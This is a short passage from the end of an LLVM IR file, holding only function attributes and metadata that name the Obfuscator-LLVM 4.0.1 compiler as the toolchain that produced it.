attributes #8 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146810738}
!2 = !{i32 -2146810329}
